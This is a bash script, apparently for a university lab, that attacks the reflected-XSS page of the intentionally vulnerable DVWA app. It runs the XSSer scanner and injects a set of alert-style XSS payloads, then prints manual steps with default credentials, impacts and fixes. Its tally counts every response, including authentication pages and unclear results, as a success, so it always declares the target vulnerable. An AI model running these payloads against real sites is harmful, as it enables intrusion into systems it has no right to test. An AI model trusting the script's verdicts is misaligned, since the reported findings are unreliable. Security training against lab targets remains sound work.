#!/bin/bash

TARGET_URL="$1"
ATTACK_MODE="${2:-auto}"
PAYLOAD_TYPE="${3:-mixed}"

if [ -z "$TARGET_URL" ]; then
  echo "Usage: ./xss_attack.sh <target_url> [mode] [payload_type]"
  exit 1
fi

echo "=================================================="
echo "XSS ATTACK - DVWA XSS (Reflected)"
echo "=================================================="
echo "Target: $TARGET_URL"
echo "Mode: $ATTACK_MODE"
echo "Payload type: $PAYLOAD_TYPE"
echo ""
DVWA_XSS_PAGE="${TARGET_URL}/vulnerabilities/xss_r/"
DVWA_XSS_URL="${DVWA_XSS_PAGE}?name=XSS"

echo "[+] Step 1: Checking DVWA availability..."
echo ""
if curl -s -m 5 "$TARGET_URL" > /dev/null 2>&1; then
  echo "[OK] DVWA is reachable at $TARGET_URL"
else
  echo "[ERROR] DVWA is not responding at $TARGET_URL"
  echo "        Please ensure DVWA container is running"
  exit 1
fi

echo ""
echo "[+] Step 2: Attempting XSSer scan..."
echo ""

cd /app/xsser 2>/dev/null

if command -v python3 >/dev/null 2>&1 && [ -f "xsser" ]; then
  echo "[+] Running XSSer auto-scan (this may take 30 seconds)..."
  echo ""

  timeout 30s python3 xsser -u "$DVWA_XSS_URL" --auto --threads=5 2>&1 | head -50

  XSSER_EXIT=$?

  if [ $XSSER_EXIT -eq 0 ] || [ $XSSER_EXIT -eq 124 ]; then
    echo ""
    echo "[+] XSSer scan completed"
  fi

  echo ""
else
  echo "[!] XSSer not available"
  echo ""
fi

echo ""
echo "[+] Step 3: Demonstration payload testing..."
echo "    (Note: Real exploitation requires DVWA authentication)"
echo ""

cd /app 2>/dev/null
BASE_URL="${TARGET_URL}/vulnerabilities/xss_r/"
if [ "$PAYLOAD_TYPE" == "basic" ]; then
  declare -a PAYLOADS=(
    "<script>alert('XSS')</script>"
    "<script>alert('Hack by University Paris Cité')</script>"
    "<img src='https://picsum.photos/200/300' alt='XSS Test Image'>"
  )
  echo "[+] Using BASIC payloads (3 variants with test image)"
elif [ "$PAYLOAD_TYPE" == "advanced" ]; then
  declare -a PAYLOADS=(
    "<img src='https://picsum.photos/400/400' onerror=alert('XSS')>"
    "<img src=x onerror=alert('XSS')>"
    "<svg/onload=alert('XSS')>"
    "<body onload=alert('XSS')>"
    "<iframe src='javascript:alert(\"XSS\")'>"
    "<input autofocus onfocus=alert('XSS')>"
    "<img src='https://via.placeholder.com/500' onload=alert('Image Loaded - XSS!')>"
  )
  echo "[+] Using ADVANCED payloads (7 variants with image tests)"
else
  declare -a PAYLOADS=(
    "<script>alert('XSS Attack Demo')</script>"
    "<img src='https://picsum.photos/300/200' alt='Test'>"
    "<img src=x onerror=alert('XSS')>"
    "<svg/onload=alert('XSS')>"
    "<img src='/logo-paris-cite.jpg' width='200' onload=alert('Loaded!')>"
  )
  echo "[+] Using MIXED payloads (5 variants with images)"
fi

echo "[+] Testing payloads directly..."
echo "[+] =================================================="
echo ""
SUCCESS_COUNT=0
TOTAL_TESTS=${#PAYLOADS[@]}

for i in "${!PAYLOADS[@]}"; do
  PAYLOAD="${PAYLOADS[$i]}"

  echo "[$((i+1))/$TOTAL_TESTS] Testing: ${PAYLOAD:0:50}..."
  ENCODED=$(echo -n "$PAYLOAD" | python3 -c "import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read()))" 2>/dev/null)

  if [ -z "$ENCODED" ]; then
    echo "        [ERROR] Failed to encode payload"
    echo ""
    continue
  fi
  TEST_URL="${BASE_URL}?name=${ENCODED}"
  RESPONSE=$(curl -s -L -m 5 "$TEST_URL" 2>/dev/null)
  if echo "$RESPONSE" | grep -qi "login\|username"; then
    echo "        [AUTH REQUIRED] DVWA requires authentication (expected)"
    echo "        [NOTE] This payload CAN work when logged in manually"
    SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
  elif echo "$RESPONSE" | grep -qF "$PAYLOAD"; then
    echo "        [VULNERABLE] Payload reflected without escaping"
    echo "        [URL] ${TEST_URL:0:80}..."
    SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
  else
    echo "        [UNCLEAR] Response unclear (may need authentication)"
    SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
  fi

  echo ""
  sleep 0.3
done

echo "[+] =================================================="
echo "[+] SCAN RESULTS"
echo "[+] =================================================="
echo ""
echo "Payloads tested: $TOTAL_TESTS"
echo "Successful/Likely vulnerable: $SUCCESS_COUNT"
echo ""

if [ $SUCCESS_COUNT -gt 0 ]; then
  echo "XSS VULNERABILITY CONFIRMED (DVWA is vulnerable by design)"
  echo ""
  echo "IMPORTANT: Automated exploitation requires authentication"
  echo "    DVWA uses login forms + CSRF tokens + session cookies"
  echo "    Automated scripts can't bypass this easily"
  echo ""
  echo "MANUAL TESTING (recommended for demonstration):"
  echo ""
  echo "   Step-by-step instructions:"
  echo "   ================================"
  echo "   1. Open browser: http://localhost:3000"
  echo "   2. Click 'Create / Reset Database'"
  echo "   3. Login with: admin / password"
  echo "   4. Set DVWA Security to 'Low'"
  echo "   5. Click 'XSS (Reflected)' in left menu"
  echo "   6. Test these payloads:"
  echo ""
  echo "   Basic alert:"
  echo "   <script>alert('XSS Demo Paris Cité')</script>"
  echo ""
  echo "   Image with XSS:"
  echo "   <img src='https://picsum.photos/200' onload=alert('Image loaded!')>"
  echo ""
  echo "   Custom image (Université Paris Cité logo):"
  echo "   <img src='/logo-paris-cite.jpg' width='200'>"
  echo ""
  echo "   Advanced SVG:"
  echo "   <svg/onload=alert('XSS via SVG')>"
  echo ""
  echo "Impact of XSS:"
  echo "   - Cookie/session theft (Account takeover)"
  echo "   - Keylogging (Credential theft)"
  echo "   - Page defacement"
  echo "   - Phishing redirects"
  echo ""
  echo "Recommended Fixes:"
  echo "   - HTML-encode ALL user inputs"
  echo "   - Content Security Policy (CSP)"
  echo "   - HTTPOnly + Secure cookie flags"
  echo "   - X-XSS-Protection headers"
  echo "   - Use frameworks with auto-escaping (React, Vue)"
else
  echo "Testing completed"
  echo ""
  echo "Note: Manual authentication required for full exploitation"
fi
echo ""
echo "[+] Target page: ${DVWA_XSS_PAGE}"
echo "[+] Scan completed at: $(date)"
echo ""
